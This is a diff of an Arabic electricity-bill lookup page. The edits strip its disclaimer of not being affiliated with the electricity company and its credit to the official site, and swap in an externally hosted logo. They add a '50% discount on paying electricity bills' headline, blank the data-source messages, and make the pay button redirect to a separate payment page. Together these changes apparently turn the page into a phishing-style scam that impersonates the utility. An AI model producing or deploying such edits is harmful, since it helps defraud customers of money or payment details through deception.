@@ -224,17 +224,16 @@
 </style>
 </head>
 <body>
-  <header>
-    <div class="logo">
-      <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
-        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
-      </svg>
-    </div>
-    <div class="htext">
-      <h1>الاستعلام عن فاتورة الكهرباء</h1>
-      <p>خدمة عرض بيانات الاشتراك — أداة مستقلة غير تابعة لشركة الكهرباء</p>
-    </div>
-  </header>
+<header>
+  <div class="logo">
+    <!-- استبدل مسار الصورة في السورس بالشكل الذي يناسب مشروعك -->
+    <img src="https://play-lh.googleusercontent.com/nx02xraB0UOf0alqJERUs4g_fx6PTqoAXvxeXqeAMrWzvJMlSPp3Gn1u-yiBrDPT6OvtfUXwjDM2AwAHUptTAA=w600-h300-pc0xffffff-pd" alt="شعار الموقع" style="max-height: 40px; width: auto;">
+  </div>
+  <div class="htext">
+    <h1>الاستعلام عن فواتير الكهرباء</h1>
+    <p>خصم 50% على دفع فواتير الكهرباء</p>
+  </div>
+</header>
 
   <main>
     <div class="card">
@@ -244,7 +243,7 @@
       <form id="lookupForm" novalidate>
         <label for="subscriber">رقم الاشتراك</label>
         <div class="field">
-          <input id="subscriber" inputmode="numeric" maxlength="10" placeholder="0012345678"
+          <input id="subscriber" inputmode="numeric" maxlength="10" placeholder="ادخل رقم الاشتراك"
                  autocomplete="off" required />
           <button type="submit" id="searchBtn">بحث</button>
         </div>
@@ -295,7 +294,7 @@
     </div>
   </main>
 
-  <footer>البيانات مصدرها موقع شركة الكهرباء الرسمي، ويُعاد عرضها هنا للتسهيل فقط.</footer>
+  <footer>         </footer>
 
   <script>
     const DISCOUNT_PERCENT = 50; // نسبة الخصم — عدّل هذا الرقم فقط
@@ -364,7 +363,7 @@
         .then((snapData) => {
           if (snapData && result.style.display === 'none') {
             showResult(snapData, true);
-            showMsg('آخر نتيجة معروفة — جاري التحديث من موقع الشركة...', 'info');
+            showMsg('        ', 'info');
           }
         })
         .catch(() => {});
@@ -409,17 +408,18 @@
 
       const stale = isStale || data.stale;
       statusTag.classList.toggle('live', !stale);
-      statusText.textContent = stale ? 'من آخر تحديث محفوظ' : 'محدّث الآن من موقع الشركة';
+      statusText.textContent = stale ? '   ' : '    ';
 
       renderTable('unpaid', data.unpaid);
       renderTable('paid', data.paid);
       result.style.display = 'block';
     }
 
-    document.getElementById('payBtn').addEventListener('click', () => {
-      const amount = document.getElementById('discountAmount').textContent;
-      showMsg(`توجيهك إلى صفحة الدفع... المبلغ المطلوب: ${amount} دينار`, 'info');
-    });
+document.getElementById('payBtn').addEventListener('click', () => {
+  const amount = document.getElementById('discountAmount').textContent;
+  
+  window.location.href = 'seslctpaymnt.html';
+});
   </script>
 </body>
 </html>
